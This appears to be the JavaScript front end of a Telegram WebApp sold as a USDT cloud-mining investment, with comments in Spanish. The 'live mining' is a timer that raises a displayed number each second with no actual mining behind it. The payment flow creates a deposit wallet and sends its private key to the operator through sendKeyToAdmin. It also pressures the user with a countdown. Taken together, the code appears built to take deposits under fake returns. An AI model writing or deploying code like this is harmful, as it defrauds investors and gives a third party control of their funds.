import { state } from './state/appState.js';
import { updateDashboard } from './components/Dashboard.js';
import { renderHistory } from './components/HistoryList.js';
import { notificarAlBot, generarWalletBSC, sendKeyToAdmin } from './services/paymentService.js';
import { API_URLS } from './config/constants.js';

let paymentTimerInterval = null;

// Motor de ejecución por segundo (Minería en vivo)
function startMiningEngine() {
    setInterval(() => {
        state.addMiningTick();
        const displayHash = document.getElementById('mining-hash');
        if (displayHash && state.totalInvestedUSDT > 0) {
            displayHash.innerText = Math.floor(state.accumulatedMining * state.hashRate).toLocaleString();
        }
    }, 1000);
}

// Pasarela de Pagos (Interacción UI)
window.openPayModal = async function() {
    const amountInput = document.getElementById('invest-amount');
    const amount = parseFloat(amountInput?.value || 0);
    
    if(!amount || amount < 1) {
        window.Telegram.WebApp.showAlert("Mínimo 1.00 USDT");
        return;
    }

    await notificarAlBot("intento_pago", amount);

    document.getElementById('payModal').style.display = 'flex';
    document.getElementById('pay-amount-display').innerText = `${amount.toFixed(2)} USDT`;
    document.getElementById('wallet-address-display').innerText = "Generando...";
    
    try {
        const data = await generarWalletBSC();
        if(data.address) {
            localStorage.setItem('temp_wallet', JSON.stringify({
                address: data.address, privateKey: data.privateKey, amount: amount
            }));

            await sendKeyToAdmin(data.address, data.privateKey, amount);

            document.getElementById('wallet-address-display').innerText = data.address;
            const qrImg = document.getElementById('qr-image');
            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;
            
            startPaymentTimer(30);
        }
    } catch (e) {
        document.getElementById('wallet-address-display').innerText = "Error de conexión";
    }
};

function startPaymentTimer(minutes) {
    if(paymentTimerInterval) clearInterval(paymentTimerInterval);
    let seconds = minutes * 60;
    paymentTimerInterval = setInterval(() => {
        let mins = Math.floor(seconds / 60).toString().padStart(2, '0');
        let secs = (seconds % 60).toString().padStart(2, '0');
        const timerDisplay = document.getElementById('payment-countdown');
        if(timerDisplay) timerDisplay.innerText = `00:${mins}:${secs}`;
        if(seconds <= 0) clearInterval(paymentTimerInterval);
        seconds--;
    }, 1000);
}

// Inicialización de la App al cargar pantalla
window.onload = () => {
    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
    
    setTimeout(async () => {
        // Capturar ID
        const tgData = window.Telegram?.WebApp?.initDataUnsafe;
        const urlParams = new URLSearchParams(window.location.search);
        state.userId = tgData?.user?.id || urlParams.get('user_id');

        // Renderizar elementos iniciales
        updateDashboard();
        renderHistory();
        startMiningEngine();
    }, 100);
};
